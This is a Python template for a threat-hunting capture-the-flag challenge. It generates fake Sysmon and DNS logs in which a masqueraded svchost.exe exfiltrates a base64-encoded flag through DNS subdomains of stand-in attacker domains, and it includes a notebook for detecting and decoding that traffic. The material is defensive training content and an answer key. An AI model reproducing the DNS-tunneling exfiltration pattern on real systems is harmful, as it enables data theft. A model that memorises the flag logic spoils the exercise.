"""Human-crafted Enterprise Threat Hunting & Living-off-the-Land Template (Module 5)."""

from pathlib import Path
from typing import Dict, Any, List, Optional
import base64
import csv
import datetime
import hashlib
import random

from app.modules.digital_governance.services.templates.base_template import BaseChallengeTemplate


class ThreatHuntingLotlTemplate(BaseChallengeTemplate):
    """
    Template for Enterprise Threat Hunting: Living-off-the-Land & DNS Tunneling.
    Synthesizes authentic Sysmon process telemetry and DNS query logs with rogue
    svchost.exe masquerading and high-entropy base64 DNS subdomain exfiltration.
    """

    template_id = "05-threat-hunting-lotl"
    title = "Operation CloudSnoop: Living-off-the-Land & DNS Tunneling Hunt"
    category = "Threat Hunting / Malicious Persistence"
    difficulty = "Advanced"
    base_points = 200
    duration_minutes = 60
    competency_id = "threat_hunting"
    competency_weight = 1.3
    tags = ["threat-hunting", "lotl", "dns-tunneling", "entropy", "sysmon", "masquerading", "cert-in"]
    mitre_techniques = ["T1036.005", "T1071.004", "T1048.003"]

    TUNNEL_DOMAINS = [
        "ns-tunnel.attacker-dns.org",
        "cdn-sync.shadow-relay.net",
        "edge-cache.darknet-routing.info",
        "api-telemetry.covert-stream.biz",
    ]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "tunnel_domain": {"type": "str", "description": "Covert DNS tunneling root domain"},
            "victim_user": {"type": "str", "description": "Target employee username"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rng = random.Random(seed) if seed else random.Random()
        slots = {
            "incident_codename": f"Operation CloudSnoop-{rng.randint(501, 999)}",
            "tunnel_domain": rng.choice(self.TUNNEL_DOMAINS),
            "victim_user": "CORP\\jsmith",
            "seed_hash": hashlib.md5(f"{seed}-{rng.random()}".encode()).hexdigest(),
        }
        if overrides:
            slots.update(overrides)
        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        return f"FLAG{{dns_tunneling_data_exfil_{slots['seed_hash'][:8]}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": "Genuine Windows svchost.exe only runs from C:\\Windows\\System32. Check Step 1 for any svchost executed from Temp or AppData.",
                "penalty": 25,
            },
            {
                "id": 2,
                "content": f"Adjust the Shannon Entropy slider to 4.0 or above in Step 2. Look for queries to '{slots['tunnel_domain']}'. Decode the base64 subdomain payload in Step 3.",
                "penalty": 40,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            "Formulate and test threat hunt hypothesis for LOLBin binary masquerading.",
            "Detect rogue svchost.exe running outside System32 in Sysmon telemetry.",
            f"Calculate Shannon entropy across DNS lookups, isolate '{slots['tunnel_domain']}', and decode the exfiltrated flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return f"""### Enterprise Threat Hunt Briefing: {slots['incident_codename']}

**Hunting Hypothesis**:
An adversary established stealthy persistence on a finance workstation using process masquerading (`svchost.exe`) and bypassed egress controls by exfiltrating sensitive records encoded inside high-entropy DNS subdomain queries.

Your mandate:
1. Hunt across endpoint Sysmon telemetry to unmask the rogue process.
2. Isolate the DNS tunneling channel using Shannon entropy analysis.
3. Reassemble and decode the subdomain payload to recover the incident flag.
"""

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        data_dir.mkdir(parents=True, exist_ok=True)

        flag = self.compute_flag(slots)
        tunnel_dom = slots["tunnel_domain"]
        victim_user = slots["victim_user"]

        # 1. Sysmon processes CSV
        proc_path = data_dir / "sysmon_processes.csv"
        proc_rows = [
            ["timestamp", "host", "user", "parent_image", "image", "command_line"],
            ["2026-09-10T10:00:28Z", "WKSTN-FIN-09", victim_user, r"C:\Windows\System32\services.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k LocalServiceNetworkRestricted"],
            ["2026-09-10T10:01:01Z", "WKSTN-FIN-09", victim_user, r"C:\Windows\explorer.exe", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r"winword.exe /n C:\docs\memo.docx"],
            ["2026-09-10T10:01:10Z", "WKSTN-FIN-09", victim_user, r"C:\Windows\explorer.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer"],
            ["2026-09-10T10:02:05Z", "WKSTN-FIN-09", victim_user, r"C:\Windows\System32\services.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p -s Schedule"],
            # Rogue masqueraded process!
            ["2026-09-10T11:42:10Z", "WKSTN-FIN-09", victim_user, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"C:\Users\jsmith\AppData\Local\Temp\svchost.exe", f"svchost.exe -tunnel -domain {tunnel_dom}"],
            ["2026-09-10T11:45:00Z", "WKSTN-FIN-09", victim_user, r"C:\Windows\explorer.exe", r"C:\Windows\System32\cmd.exe", "cmd.exe /c exit"],
        ]
        # Add 50 background benign events
        base_t = datetime.datetime(2026, 9, 10, 10, 5, 0)
        for i in range(50):
            t_str = (base_t + datetime.timedelta(seconds=i * 65)).strftime("%Y-%m-%dT%H:%M:%SZ")
            proc_rows.append([t_str, "WKSTN-FIN-09", victim_user, r"C:\Windows\System32\services.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k LocalService"])

        with open(proc_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerows(proc_rows)

        # 2. DNS queries CSV with high-entropy tunnel queries
        dns_path = data_dir / "dns_queries.csv"
        dns_rows = [["timestamp", "client_ip", "query_name", "query_type"]]

        legit_domains = [
            "fonts.googleapis.com", "slack.com", "update.microsoft.com",
            "api.github.com", "google.com", "login.live.com", "office.com"
        ]
        # 100 baseline benign queries
        for k in range(100):
            t_str = (base_t + datetime.timedelta(seconds=k * 30)).strftime("%Y-%m-%dT%H:%M:%SZ")
            dns_rows.append([t_str, "10.0.1.109", f"sub{k}.{random.choice(legit_domains)}", "A"])

        # Base64 encode the flag for tunneling exfiltration
        b64_flag = base64.urlsafe_b64encode(flag.encode("utf-8")).decode("ascii").rstrip("=")
        # Split into 4 chunks
        chunk_len = max(len(b64_flag) // 4, 1)
        chunks = [b64_flag[i:i + chunk_len] for i in range(0, len(b64_flag), chunk_len)]

        exfil_t = datetime.datetime(2026, 9, 10, 11, 42, 40)
        for idx, chk in enumerate(chunks):
            t_chk = (exfil_t + datetime.timedelta(seconds=idx * 3)).strftime("%Y-%m-%dT%H:%M:%SZ")
            dns_rows.append([t_chk, "10.0.1.109", f"chunk{idx:02d}.{chk}.{tunnel_dom}", "TXT"])

        # Full payload query
        dns_rows.append([(exfil_t + datetime.timedelta(seconds=30)).strftime("%Y-%m-%dT%H:%M:%SZ"), "10.0.1.109", f"exfil-payload.{b64_flag}.{tunnel_dom}", "TXT"])

        # Extra 50 benign queries
        for m in range(50):
            t_str = (exfil_t + datetime.timedelta(seconds=40 + m * 20)).strftime("%Y-%m-%dT%H:%M:%SZ")
            dns_rows.append([t_str, "10.0.1.109", f"node{m}.{random.choice(legit_domains)}", "A"])

        with open(dns_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerows(dns_rows)

        return {"sysmon_processes.csv": proc_path, "dns_queries.csv": dns_path}

    def generate_notebook(self, slots: Dict[str, Any], output_dir: Path) -> Path:
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        code = _NOTEBOOK_TEMPLATE
        code = code.replace("__APP_TITLE__", f"Threat Hunt: {slots.get('incident_codename', 'Operation CloudSnoop')}")
        code = code.replace("__INCIDENT_CODENAME__", slots.get('incident_codename', 'INC-0505-CLOUDSNOOP'))
        code = code.replace("__TUNNEL_DOMAIN__", slots.get('tunnel_domain', 'ns-tunnel.attacker-dns.org'))
        code = code.replace("__TARGET_HASH__", dynamic_hash)

        target_nb.write_text(code, encoding="utf-8")
        return target_nb


_NOTEBOOK_TEMPLATE = r'''import marimo

__generated_with = "0.24.1"
app = marimo.App(width="full", app_title="__APP_TITLE__")


@app.cell
def __():
    import base64
    import hashlib
    import json
    import math
    from pathlib import Path
    import re
    import marimo as mo
    import pandas as pd

    return Path, base64, hashlib, json, math, mo, pd, re


@app.cell
def __(Path, math, pd):
    # Locate data files across environments
    possible_dirs = [
        Path("data"),
        Path("../data"),
        Path("/workspace/data"),
        Path("challenges/05-threat-hunting-lotl/data"),
    ]
    if "__file__" in globals():
        possible_dirs.insert(0, Path(__file__).resolve().parent.parent / "data")

    data_dir = next((p for p in possible_dirs if p.exists()), Path("data"))

    proc_file = data_dir / "sysmon_processes.csv"
    dns_file = data_dir / "dns_queries.csv"

    df_proc = pd.read_csv(proc_file) if proc_file.exists() else pd.DataFrame()
    df_dns = pd.read_csv(dns_file) if dns_file.exists() else pd.DataFrame()

    def shannon_entropy(s):
        if not s or not isinstance(s, str):
            return 0.0
        prob = [float(s.count(c)) / len(s) for c in dict.fromkeys(s)]
        return -sum([p * math.log(p) / math.log(2.0) for p in prob])

    if not df_dns.empty and "query_name" in df_dns.columns:
        df_dns["query_len"] = df_dns["query_name"].str.len()
        df_dns["entropy"] = df_dns["query_name"].apply(shannon_entropy)
        max_entropy = df_dns["entropy"].max()
    else:
        max_entropy = 0.0

    # Locate rogue masqueraded processes
    if not df_proc.empty and "image" in df_proc.columns:
        rogue_proc = df_proc[
            df_proc["image"].str.endswith("svchost.exe", na=False)
            & ~df_proc["image"].str.startswith("C:\\Windows\\System32\\", na=False)
        ]
        rogue_count = len(rogue_proc)
    else:
        rogue_proc = pd.DataFrame()
        rogue_count = 0

    return (
        data_dir,
        df_dns,
        df_proc,
        dns_file,
        max_entropy,
        possible_dirs,
        proc_file,
        rogue_count,
        rogue_proc,
        shannon_entropy,
    )


@app.cell
def __(mo):
    # Analyst Sidebar: Threat Hunting Scope, MITRE ATT&CK & Checklist
    check_lotl = mo.ui.checkbox(
        label="1. Formulate hunt hypothesis for LOLBin masquerading", value=False
    )
    check_proc = mo.ui.checkbox(
        label="2. Detect anomalous svchost outside System32", value=False
    )
    check_domain = mo.ui.checkbox(
        label="3. Extract tunneling domain from command line", value=False
    )
    check_entropy = mo.ui.checkbox(
        label="4. Calculate Shannon entropy to isolate tunneling queries", value=False
    )
    check_decode = mo.ui.checkbox(
        label="5. Reassemble and decode exfiltrated flag", value=False
    )

    hints = mo.accordion(
        {
            "💡 Hint 1: Process Masquerading": mo.md(
                "Genuine Windows `svchost.exe` always executes from `C:\\Windows\\System32\\svchost.exe`. Check **Step 1** for any `svchost.exe` launched from user directories like `AppData\\Local\\Temp`."
            ),
            "💡 Hint 2: Identifying the C2 Domain": mo.md(
                "Inspect the command line parameters of the rogue process in **Step 1**. Notice the `-domain <domain>` argument."
            ),
            "💡 Hint 3: Entropy & Base64 Decoding": mo.md(
                "In **Step 2**, increase the Shannon Entropy slider to `4.0` or higher. Look at queries matching the tunneling domain. In **Step 3**, decode the Base64 subdomain payload to uncover the flag."
            ),
        }
    )

    sidebar_content = mo.vstack(
        [
            mo.md("## 🎯 Threat Hunter"),
            mo.md("**Operation**: `__INCIDENT_CODENAME__`"),
            mo.md("**Target**: `Finance Workstation Fleet`"),
            mo.md("**Classification**: `TLP:AMBER` | Severity: **HIGH**"),
            mo.md("---"),
            mo.md("### 🎯 Hunting Checklist"),
            check_lotl,
            check_proc,
            check_domain,
            check_entropy,
            check_decode,
            mo.md("---"),
            mo.md("### 🗺️ MITRE ATT&CK Matrix"),
            mo.md(
                "- **T1036.005**: Masquerading: Match Legitimate Name\n"
                "- **T1071.004**: DNS Tunneling\n"
                "- **T1048.003**: Exfiltration Over Alternative Protocol"
            ),
            mo.md("---"),
            hints,
        ]
    )

    mo.sidebar(sidebar_content)
    return (
        check_decode,
        check_domain,
        check_entropy,
        check_lotl,
        check_proc,
        hints,
        sidebar_content,
    )


@app.cell
def __(df_dns, df_proc, max_entropy, mo, rogue_count):
    # Header Banner & Stat KPIs
    header_view = mo.vstack(
        [
            mo.md("""
            # 🎯 Incident: __INCIDENT_CODENAME__ — Advanced Threat Hunt
            ### Enterprise Threat Hunting: Living-off-the-Land & DNS Tunneling Exfiltration
            """),
            mo.callout(
                mo.md(
                    "**Hunting Hypothesis**: *An adversary established persistence on a finance workstation using process masquerading (`svchost.exe`) and bypassed firewall perimeter controls by exfiltrating sensitive records encoded inside high-entropy DNS subdomain queries.* Hunt across endpoint Sysmon telemetry and network DNS queries to unmask the rogue process, isolate the tunneling channel, and recover the exfiltrated flag."
                ),
                kind="warn",
            ),
            mo.hstack(
                [
                    mo.stat(
                        value=f"{len(df_proc)} Processes",
                        label="Endpoint Sysmon Telemetry",
                        caption="Host: WKSTN-FIN-09",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{rogue_count} Detected",
                        label="Masqueraded Binaries",
                        caption="Non-System32 svchost.exe",
                        direction="increase",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(df_dns)} Lookups",
                        label="Audited DNS Lookups",
                        caption="Internal Resolver Logs",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{max_entropy:.2f} Bits",
                        label="Peak Shannon Entropy",
                        caption="Normal Domain Mean: ~2.5 Bits",
                        direction="increase",
                        bordered=True,
                    ),
                ],
                justify="start",
                gap=1,
            ),
        ]
    )
    return (header_view,)


@app.cell
def __(mo):
    # Step 1: Process Masquerading Search Control
    proc_filter = mo.ui.text(
        placeholder="Filter process name, image path, or parameters (e.g. svchost, Temp)...",
        value="",
        label="Process Filter:",
    )
    return (proc_filter,)


@app.cell
def __(df_proc, mo, proc_filter, rogue_proc):
    # Step 1: Process Masquerading Results View
    filtered_proc = df_proc
    search_term = proc_filter.value.strip().lower()
    if search_term:
        filtered_proc = df_proc[
            df_proc["image"].str.contains(search_term, case=False, na=False)
            | df_proc["command_line"].str.contains(search_term, case=False, na=False)
        ]

    proc_table = mo.ui.table(
        filtered_proc,
        selection=None,
        pagination=True,
        page_size=8,
        show_column_summaries=False,
    )

    if (
        search_term
        and any(
            term in search_term for term in ["svchost", "temp", "tunnel", "appdata"]
        )
        and not rogue_proc.empty
    ):
        r = rogue_proc.iloc[0]
        masquerade_callout = mo.callout(
            mo.md(
                f"🚨 **ROGUE PROCESS DETECTED**:\n\n"
                f"- **Process Name**: `{r.get('process_name', 'svchost.exe')}` (PID: `{r.get('pid', 'N/A')}`)\n"
                f"- **Image Path**: `{r.get('image')}`\n"
                f"- **Command Line**: `{r.get('command_line')}`\n"
                f"- **Threat Assessment**: Legitimate `svchost.exe` only executes from `C:\\Windows\\System32\\`. The command line parameters explicitly initialize a DNS tunneling client pointing to nameserver **`__TUNNEL_DOMAIN__`**!"
            ),
            kind="danger",
        )
    else:
        masquerade_callout = mo.md("")

    step1_view = mo.vstack(
        [
            mo.md("## 🕵️ Step 1: Endpoint Process Masquerading Analysis"),
            mo.md("### 🔍 Auditing Endpoint Sysmon Process Telemetry:"),
            proc_filter,
            masquerade_callout,
            proc_table,
        ]
    )
    return filtered_proc, masquerade_callout, proc_table, search_term, step1_view


@app.cell
def __(mo):
    # Step 2: DNS Tunneling Entropy Analysis Controls
    entropy_slider = mo.ui.slider(
        start=2.0,
        stop=5.2,
        step=0.1,
        value=3.8,
        label="Minimum Shannon Entropy (H):",
    )
    len_slider = mo.ui.slider(
        start=10,
        stop=120,
        step=5,
        value=30,
        label="Minimum Query Length:",
    )
    dns_search = mo.ui.text(
        placeholder="Filter domain (e.g. attacker-dns.org)...",
        label="Domain Filter:",
    )
    return dns_search, entropy_slider, len_slider


@app.cell
def __(df_dns, dns_search, entropy_slider, len_slider, mo):
    # Step 2: Filtered DNS Tunneling Queries Display
    if not df_dns.empty:
        cand = df_dns[
            (df_dns["entropy"] >= entropy_slider.value)
            & (df_dns["query_len"] >= len_slider.value)
        ]
        if dns_search.value.strip():
            cand = cand[
                cand["query_name"].str.contains(
                    dns_search.value.strip(), case=False, na=False
                )
            ]
        cand = cand.sort_values(by="entropy", ascending=False)
        dns_hunt_table = mo.ui.table(
            cand[
                ["timestamp", "query_name", "query_len", "entropy", "query_type"]
                if "query_type" in cand.columns
                else cand[["timestamp", "query_name", "query_len", "entropy"]]
            ],
            selection=None,
            pagination=True,
            page_size=8,
            show_column_summaries=False,
        )
    else:
        cand = df_dns
        dns_hunt_table = mo.md("No DNS records found.")

    step2_view = mo.vstack(
        [
            mo.md("## 📡 Step 2: DNS Tunneling Shannon Entropy Analysis"),
            mo.md(
                "Adjust the Shannon Entropy threshold and query length sliders to isolate DNS tunneling activity:"
            ),
            mo.hstack([entropy_slider, len_slider], gap=1),
            dns_search,
            dns_hunt_table,
        ]
    )
    return cand, dns_hunt_table, step2_view


@app.cell
def __(mo):
    # Step 3: Subdomain Decoder Input Control
    decoder_input = mo.ui.text(
        value="",
        placeholder="Paste or enter high-entropy Base64 subdomain chunk from Step 2...",
        label="Subdomain Encoded Data Chunk:",
        full_width=True,
    )
    return (decoder_input,)


@app.cell
def __(base64, decoder_input, mo):
    # Step 3: Subdomain Payload Reactive Decoder & Display
    decoded_text = ""
    val = decoder_input.value.strip()
    if val:
        try:
            # Strip subdomains if full domain pasted
            chunk = val.split(".")[0] if "." in val else val
            padded = chunk + "=" * (-len(chunk) % 4)
            decoded_text = base64.urlsafe_b64decode(padded).decode(
                "utf-8", errors="replace"
            )
        except Exception as err:
            decoded_text = f"Decode error: {err}"

    step3_view = mo.vstack(
        [
            mo.md("## 🔓 Step 3: Subdomain Payload Reassembly & Decoder Workbench"),
            mo.md(
                "DNS tunneling protocols break exfiltrated files into Base64 URL-safe chunks appended as subdomains. Copy an anomalous subdomain chunk from Step 2 into the decoder below:"
            ),
            decoder_input,
            mo.md(f"#### 🔓 Reassembled Decoded Secret:\n```text\n{decoded_text}\n```"),
        ]
    )
    return decoded_text, step3_view, val


@app.cell
def __(mo):
    # Step 4: Flag Verification Input Control
    candidate_flag = mo.ui.text(
        placeholder="FLAG{...}",
        label="Enter Extracted DNS Tunneling Flag to Verify:",
    )
    return (candidate_flag,)


@app.cell
def __(candidate_flag, hashlib, mo, re):
    val_flag = candidate_flag.value.strip()
    target_hash = "__TARGET_HASH__"

    if not val_flag:
        flag_feedback = mo.md(
            "Enter the flag recovered from the decoded DNS tunneling subdomain."
        )
        ioc_view = mo.md(
            "🔒 *Threat Hunting Findings & IOC Report locked until valid flag is verified.*"
        )
    elif hashlib.sha256(val_flag.encode()).hexdigest() == target_hash:
        flag_feedback = mo.callout(
            mo.md(
                "🎉 **FLAG VERIFIED CORRECT!**\n\n"
                "Your recovered threat hunting flag is verified! Now submit this flag in the **Submit Flag** box in the left portal pane to register your 200 points and Threat Hunting competency!"
            ),
            kind="success",
        )
        ioc_view = mo.vstack(
            [
                mo.md("### 📋 Confirmed Threat Hunting Findings (IOCs):"),
                mo.md("""
                | Indicator Type | Value | Threat Context |
                | :--- | :--- | :--- |
                | **Masqueraded Binary** | `svchost.exe` | Executing from `C:\\Users\\jsmith\\AppData\\Local\\Temp` |
                | **Tunneling Tool Parameters** | `-tunnel -domain __TUNNEL_DOMAIN__` | Directs DNS queries to adversary nameserver |
                | **C2 Nameserver Domain** | `__TUNNEL_DOMAIN__` | Authoritative nameserver receiving exfil chunks |
                | **Channel Shannon Entropy** | `> 4.5 bits` | High-entropy obfuscated base64 query names |
                """),
            ]
        )
    elif re.match(r"^FLAG\{.*\}$", val_flag):
        flag_feedback = mo.callout(
            mo.md("❌ Incorrect flag. Verify the decoded Base64 payload in Step 3."),
            kind="danger",
        )
        ioc_view = mo.md(
            "🔒 *Threat Hunting Findings & IOC Report locked until valid flag is verified.*"
        )
    else:
        flag_feedback = mo.callout(
            mo.md(
                "⚠️ Flag format invalid. Flags must begin with `FLAG{` and end with `}`."
            ),
            kind="warn",
        )
        ioc_view = mo.md(
            "🔒 *Threat Hunting Findings & IOC Report locked until valid flag is verified.*"
        )

    step4_view = mo.vstack(
        [
            mo.md("## 🏁 Step 4: Verify Incident Flag & Hunt Findings"),
            candidate_flag,
            flag_feedback,
            mo.md("---"),
            ioc_view,
        ]
    )
    return flag_feedback, ioc_view, step4_view, target_hash, val_flag


@app.cell
def console_root(
    header_view,
    mo,
    step1_view,
    step2_view,
    step3_view,
    step4_view,
):
    styles = mo.Html("""
    <style>
    [data-testid="chrome-sidebar"], #app-chrome-sidebar, #app-chrome-panel, .resize-handle { display: none !important; }
    [data-testid="drag-button"], [data-testid="cell-actions-button"], [data-testid="create-cell-button"], [data-testid="run-button"], [data-testid="hide-code-button"], [data-testid="fullscreen-output-button"], [data-testid="expand-output-button"], .hover-actions-parent > .hover-action, .shoulder-right, .cell-actions, .cell-actions-button, .cell-bottom-menu, .add-cell-button { display: none !important; }
    [data-testid="filename-input"], [data-testid="chrome-controls-top-right"], [data-testid="chrome-controls-bottom-right"], [data-testid="chrome-footer"], [data-testid="footer-panel"] { display: none !important; }
    .marimo-cell:not(:has(.console-topbar)) { display: none !important; }
    .marimo-cell .cm-editor, .marimo-cell .cm-scroller, .marimo-cell .cell-editor, [data-testid="cell-editor"] { display: none !important; height: 0 !important; overflow: hidden !important; }
    .marimo-cell:has(.console-topbar) { width: 100% !important; max-width: 100% !important; margin: 0 !important; padding: 0 4px !important; }
    #App, main, #app-chrome-body, [data-testid="column-container"] { max-width: 100% !important; padding: 0 !important; margin: 0 !important; }
    .console-topbar { display: flex; align-items: center; justify-content: space-between; background: #0f172a; border: 1px solid #1e293b; border-radius: 8px; padding: 10px 16px; margin-bottom: 10px; }
    .console-topbar .title { font-size: 13px; font-weight: 700; color: #e2e8f0; display: flex; align-items: center; gap: 10px; }
    </style>
    """)
    header = mo.Html('<div class="console-topbar" style="display:none !important; height:0; margin:0; padding:0; border:none;"></div>')
    console = mo.ui.tabs(
        {
            "📋 Triage & Hypothesis": header_view,
            "🕵️ Step 1: Masquerading Audit": step1_view,
            "📡 Step 2: Shannon Entropy": step2_view,
            "🔓 Step 3: Payload Decoder": step3_view,
            "🏁 Step 4: Verify Findings": step4_view,
        }
    )
    workspace = mo.vstack([styles, header, console])
    workspace
    return console, header, styles, workspace


if __name__ == "__main__":
    app.run()
'''
